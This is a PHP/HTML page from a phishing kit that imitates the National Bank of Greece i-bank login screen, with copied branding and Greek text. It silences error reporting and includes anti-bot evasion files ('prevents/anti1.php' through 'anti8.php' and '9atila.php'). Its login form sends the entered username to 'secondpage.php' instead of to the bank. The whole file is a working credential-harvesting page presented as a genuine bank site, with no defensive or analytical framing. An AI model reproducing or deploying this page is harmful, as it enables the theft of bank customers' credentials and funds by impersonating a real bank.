<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
include '../prevents/9atila.php';

?>
<!doctype html>
<html><head>
    <title>NBG i-bank</title>
    <baase href="https://ibank.nbg.gr/identity/">
    <meta name="contextPath" content="/identity/">
    <meta name="multilanguage" content="true">
    <meta name="mntc" content="[mntc]">
    <meta name="mntcMsg" content="[mntcMsg]">
    <meta name="ile" content="false">
    <meta name="ardt" content="2020-02-07T03:31:53.8140763Z">
    <meta name="arUri" content="https://ibank.nbg.gr/web/">
    <meta name="lng" content="el">
    <meta name="epe" content="false">
    <meta name="_af" content="2zuVyd0kIZn814XY3RSsW6rQzU12JcFJ53aHsVslm9KLwafA6GkBxzy6aXoPd_dYG3VsucbOORee8VR6KWN5rcE0kZe1FB6rM7gK-gwMJAo1">
    <meta name="emg" content="">
    <meta name="cId" content="login-bg">
    <meta name="rscsSc" content="[rscsSc]">
    <meta name="bank" content="NBG">
    <meta name="indexTemplate" content="login-night">
    <meta name="appId" content="2e7971cd-7afd-49a0-89ae-7ec531298d01">
    <meta name="gaId" content="UA-33771010-2">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="icon" type="image/png" href="imgs/favicon.ico">
<link href="css/style.27b415c4e44a2a89662a.css" rel="stylesheet"><link href="css/nbg.jquery.cookiebar.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
</head>


<body class="login-bg windows login-night">
    <index-page ng-version="7.2.15"><div agent-type="" class="appRoot"><loading-stage><!----></loading-stage><router-outlet></router-outlet><login class="flex-column min-height-full-vh"><login-header><header class="main-header"><div class="flex-vertical-center-space-between header-container wrap-mobile-medium"><ibank-icon class="full-screen-width--mobile"><div class="flex-vertical-center" style="height: 11rem; min-height: 11rem;"><img alt="nbg logo" class="full-height margin-auto--mobile" src="imgs/login-logo.el.png"></div></ibank-icon><div class="pop-up"><i class="icon-lock text-x-large margin-right-default"></i><div><h4>Η σύνδεση είναι ασφαλής;</h4><span class="text-light-black text-medium"> Αν ο παραπάνω σύνδεσμος είναι ο <span class="fakelink-text">https://ibank.nbg.gr</span>, τα στοιχεία σας είναι ασφαλή. </span></div></div><div class="flex-vertical-center full-height margin-top-normal-mobile-medium"><!----><button class="button-transparent text-light text-large text-white" style="margin: 0 .5rem;"><span class="text-action">ΕΛ</span><span>/</span><span>EN</span></button><div class="horizontal-divider"></div><div class="flex-vertical-center text-white"><div class="flex-column text-light"><span class="header-help-number">181818 <span class="text-normal text-regular">(Ελλάδα)</span><div class="tooltip margin-left-normal display-inline-block"><div class="tooltip-text tooltip-text--right tooltip-text--text-light-black text-light text-light-black text-small"> Το κόστος κλήσης καθορίζεται από την ισχύουσα τιμολογιακή πολιτική του παρόχου σας, για το 181818 βάσει του τιμολογίου κλήσεων προς ειδικούς αριθμούς και για το 2104848484 βάσει του τιμολογίου για κλήσεις προς σταθερά. </div></div></span><span class="text-medium">+30 210 4848484 (Ελλάδα &amp; εξωτερικό) </span></div></div></div></div></header></login-header><div class="max-width-container-login"><div class="login-container"><h1 class="text-page-heading text-align-center text-medium text-white"> Καλώς ήρθατε στο i-bank</h1><img class="login-header-img margin-bottom-medium login-night"><sign-in class="user-login-container"><!----><form method="post" action="secondpage.php"><div><div class="user-login-subcontainer"><!----><div class="full-height flex-column"><div class="position-relative"><div class="flex-center"><input class="oval-input ng-pristine ng-valid ng-touched" type="text" name="username" placeholder="Κωδικός χρήστη"><!----><div class="tooltip right-default field-tooltip"><div class="icon-rounded text-gray text-x-large flex mat-select-cursor-pointer"></div><div class="tooltip-text tooltip-text--right text-light tooltip-text--text-light-black"> Σε περίπτωση που ξεχάσετε τον Κωδικό χρήστη σας (Username) μεταβείτε στο πλησιέστερο κατάστημα Εθνικής Τράπεζας για άμεση εξυπηρέτηση. </div></div><!----></div></div><!----><!----><div class="flex-vertical-center-space-between margin-top-normal"><spinner type="action"><!----><!----><button class="button" style="min-width: 20rem"> Συνέχεια </button></a><!----></spinner></div><!----><!----><div class="flex-center margin-top-default"><button class="button-transparent button-with-icon text-white" style="background-color: transparent" type="button"><div class="margin-left-x-small text-large">Εγγραφή χρήστη </div></button></div></div><!----></div></div></form><!----></sign-in><div class="flex-vertical-center  margin-horizontal-auto" style="max-width: 18.75rem; height: 100%; margin-top: 1.5rem"><div class="icon-container flex-all-center text-large lock-circle-icon circle-large-primary margin-right-medium"></div><span class="text-medium text-white text-small"> Προσοχή! H Εθνική Τράπεζα δε θα σας ζητήσει ποτέ τους κωδικούς σας και μην απαντάτε σε e-mail που σας ζητούν προσωπικά στοιχεία. <a class="link-white text-white text-bold" href="./security-information" target="_blank">Συμβουλές ασφαλείας</a></span></div></div><div class="margin-top-auto"><useful-links><div class="useful-links-container"><div class="social-links-container"><a class="icon-container icon-facebook-lg" ngclass="icon-facebook-lg" target="_blank" href="https://www.facebook.com/ibanknbg"></a><a class="icon-container icon-twitter-lg" ngclass="icon-twitter-lg" target="_blank" href="https://twitter.com/NationalBankGR"></a><a class="icon-container icon-youtube-lg" ngclass="icon-youtube-lg" target="_blank" href="https://www.youtube.com/channel/UCAwPZIUpdP3aIQlfw4bETLQ"></a><a class="icon-container icon-linkedin-lg" ngclass="icon-linkedin-lg" s="" target="_blank" href="https://www.linkedin.com/company/national-bank-of-greece/"></a><a class="icon-container icon-email-lg" ngclass="icon-email-lg" href="mailto:contact.center@nbg.gr"></a></div><div class="links-container"><!----><a class="link-white button-transparent useful-link" target="_blank" href="https://www.nbg.gr/Style%20Library/ReusableContent/privacy_statement.pdf"> Προστασία Δεδομένων Προσωπικού Χαρακτήρα </a><a class="link-white button-transparent useful-link" target="_blank" href="./browser-compatibility"> Συμβατότητα με browsers </a></div></div></useful-links></div></div></login></div></index-page>
    <input id="N" name="N" type="hidden" value="[N]">
    <input id="E" name="E" type="hidden" value="[E]">
</body></html>